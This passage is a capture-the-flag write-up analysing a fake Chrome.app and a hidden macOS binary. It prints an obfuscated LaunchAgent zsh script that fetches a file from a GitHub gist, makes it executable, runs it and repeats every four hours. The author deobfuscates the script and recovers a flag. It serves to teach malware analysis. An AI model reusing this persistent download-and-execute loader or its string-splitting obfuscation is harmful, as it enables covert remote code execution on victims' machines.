---------  ---------- -----   ----
        0  2023-09-27 20:27   welcome/
        0  2023-09-27 23:04   welcome/.hidden/
     8196  2023-09-27 22:49   welcome/.DS_Store
      120  2023-09-27 22:49   __MACOSX/welcome/._.DS_Store
        0  2023-09-27 20:41   welcome/Chrome.app/
      399  2023-09-27 20:41   __MACOSX/welcome/._Chrome.app
    33608  2023-09-27 23:03   welcome/.hidden/welcomeToThePark
        0  2023-09-27 20:18   welcome/Chrome.app/Contents/
        0  2023-09-27 20:18   welcome/Chrome.app/Icon^M
  1181326  2023-09-27 20:18   __MACOSX/welcome/Chrome.app/._Icon^M
    39984  2023-09-27 20:16   welcome/Chrome.app/FlashPlayer.ico
      631  2023-09-27 20:16   __MACOSX/welcome/Chrome.app/._FlashPlayer.ico
        0  2023-09-27 20:18   welcome/Chrome.app/Contents/MacOS/
        0  2023-09-27 20:27   welcome/Chrome.app/Contents/Resources/
     2645  2023-09-27 20:18   welcome/Chrome.app/Contents/Info.plist
        8  2023-09-27 20:18   welcome/Chrome.app/Contents/PkgInfo
    99064  2023-09-27 20:18   welcome/Chrome.app/Contents/MacOS/applet
      238  2023-09-27 20:18   __MACOSX/welcome/Chrome.app/Contents/MacOS/._applet
       61  2023-09-27 20:27   welcome/Chrome.app/Contents/Resources/interesting_thing.command
      276  2023-09-27 20:27   __MACOSX/welcome/Chrome.app/Contents/Resources/._interesting_thing.command
      362  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/applet.rsrc
        0  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/description.rtfd/
        0  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/Scripts/
    71867  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/applet.icns
      144  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/description.rtfd/TXT.rtf
      654  2023-09-27 20:18   welcome/Chrome.app/Contents/Resources/Scripts/main.scpt
      176  2023-09-27 20:18   __MACOSX/welcome/Chrome.app/Contents/Resources/Scripts/._main.scpt
---------                     -------
  1439759                     27 files
```

The file inside the `welcome/.hidden` folder is a Mac binary:

```console
$ file welcomeToThePark
welcomeToThePark: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
```

Using `strings` on it, we find a base64 string with decodes to some bash script:

```html
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.huntress.ctf</string><key>ProgramArguments</key><array><string>/bin/zsh</string><string>-c</string><string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string></array><key>RunAtLoad</key><true /><key>StartInterval</key><integer>14400</integer></dict></plist>
```

With an editor having syntax highlighting it is easier to clean the code:

```bash
A0b='tmp="$(m';
A0bERheZ='ktemp /tmp/XX';
A0bERheZX='XXXXXX)"';
A0bER='; curl --';
A0bE='retry 5 -f ';
A0bERh='"https://';
A0bERheZXDRi='gist.githu';
xbER='b.com/s';
juuQ='tuartjas';
juuQQ7l7X5='h/a7d18';
juuQQ7l7X5yX='7c44f4327';
juuQQ7l7X5y='739b752d037be45f01';
juuQQ7='" -o "${tmp}"; i';
juuQQ7l7='f [[ -s "${tmp}';
juuQQ7l7X='" ]];';
juQQ7l7X5y=' then chm';
juQQ7l='od 777 "${tmp}"; ';
zRO3OUtcXt='"${tmp}"';
zRO3OUt='; fi; rm';
zRO3OUtcXteB=' "${tmp}"';
echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh
```

So if we remove the final pipe we won't be harmed, let's execute the echo.

```bash
tmp="$(mktemp /tmp/XXXXXXXX)"; curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}"; if [[ -s "${tmp}" ]]; then chmod 777 "${tmp}"; "${tmp}"; fi; rm "${tmp}"
```

The Gist file is in fact a picture. The flag is inside:

```console
$ strings /tmp/JohnHammond.jpg | grep flag
; flag{680b736565c76941a364775f06383466}
```
